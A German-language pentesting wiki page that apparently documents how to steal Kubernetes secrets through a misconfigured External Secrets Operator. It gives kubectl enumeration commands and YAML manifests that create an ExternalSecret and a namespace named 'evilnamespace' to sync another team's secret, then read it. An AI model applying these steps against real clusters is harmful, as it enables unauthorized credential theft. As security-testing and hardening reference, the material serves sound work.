# Externer Secret Operator

**Der ursprüngliche Autor dieser Seite ist** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Diese Seite gibt einige Hinweise darauf, wie Sie Geheimnisse von einem falsch konfigurierten ESO oder einer Anwendung stehlen können, die ESO verwendet, um ihre Geheimnisse zu synchronisieren.

## Haftungsausschluss

Die unten gezeigte Technik kann nur unter bestimmten Umständen funktionieren. Es hängt beispielsweise von den Anforderungen ab, die erfüllt sein müssen, um ein Geheimnis in einem Namespace zu synchronisieren, den Sie besitzen / kompromittiert haben. Sie müssen es selbst herausfinden.

## Voraussetzungen

1. Ein Standbein in einem Kubernetes / Openshift-Cluster mit Administratorrechten in einem Namespace
2. Lesezugriff mindestens auf ExternalSecret auf Cluster-Ebene
3. Finden Sie heraus, ob bestimmte Labels / Annotationen oder Gruppenmitgliedschaften erforderlich sind, die es ESO ermöglichen, Ihr Geheimnis zu synchronisieren. Wenn Sie Glück haben, können Sie beliebige definierte Geheimnisse frei stehlen.

### Informationen zum vorhandenen ClusterSecretStore sammeln

Angenommen, Sie haben einen Benutzer, der ausreichende Rechte hat, um auf diese Ressource zuzugreifen; beginnen Sie damit, zunächst die vorhandenen _**ClusterSecretStores**_ aufzulisten.
```sh
kubectl get ClusterSecretStore
```
### Externe Secret-Auflistung

Angenommen, Sie haben einen ClusterSecretStore mit dem Namen _**mystore**_ gefunden. Fahren Sie fort, indem Sie seine zugehörigen externen Secrets auflisten.
```sh
kubectl get externalsecret -A | grep mystore
```
_Diese Ressource ist namespace-spezifisch, daher sollten Sie die -A Option hinzufügen, um in allen Namespaces zu suchen, es sei denn, Sie wissen bereits, in welchem Namespace Sie suchen müssen._

Sie sollten eine Liste der definierten externalsecrets erhalten. Nehmen wir an, Sie haben ein externalsecret-Objekt namens _**mysecret**_ gefunden, das vom Namespace _**mynamespace**_ definiert und verwendet wird. Sammeln Sie weitere Informationen darüber, welche Art von Geheimnis es enthält.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Zusammenstellen der Teile

Von hier aus können Sie den Namen eines oder mehrerer Geheimnisnamen erhalten (wie im Secret-Ressourcen definiert). Sie erhalten eine Ausgabe ähnlich wie:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
* Nennen Sie einen ClusterSecretStore
* Name eines ExternalSecrets
* Name des Geheimnisses

Jetzt, da wir alles haben, was wir brauchen, können Sie ein ExternalSecret erstellen (und gegebenenfalls einen neuen Namespace patchen/erstellen, um die erforderlichen Voraussetzungen zu erfüllen, damit Ihr neues Geheimnis synchronisiert wird):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Nach ein paar Minuten, wenn die Synchronisationsbedingungen erfüllt sind, sollten Sie in der Lage sein, das durchgesickerte Geheimnis innerhalb Ihres Namensraums anzuzeigen.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referenzen

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
